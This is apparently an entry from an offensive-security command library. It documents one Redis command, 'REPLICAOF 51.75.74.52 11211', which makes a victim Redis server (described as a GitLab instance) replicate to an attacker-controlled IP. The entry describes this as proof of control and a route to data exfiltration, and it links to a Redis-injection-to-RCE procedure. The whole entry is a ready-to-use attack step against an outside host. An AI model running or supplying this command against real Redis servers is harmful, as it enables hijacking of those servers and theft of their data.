---
id: cmd-redis-replicaof
name: redis-replicaof
type: command
executor: redis-cli
data: REPLICAOF 51.75.74.52 11211\n\n
output: Ping messages from GitLab Redis to attacker's nc listener
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.319Z'
platforms:
  - Linux
tags:
  - redis
  - replication
verified: false
validated: true
submitted: true
---

# redis-replicaof

## Command

```bash
REPLICAOF 51.75.74.52 11211\n\n
```

## Description

Configures Redis to replicate to the attacker's server, proving control and allowing potential data exfil.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| host | Attacker IP (51.75.74.52) | Yes |
| port | Listener port (11211) | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

OK response, followed by replication pings on nc.

## Related

- [[procedures/Exploit-Redis-Injection-for-RCE]]
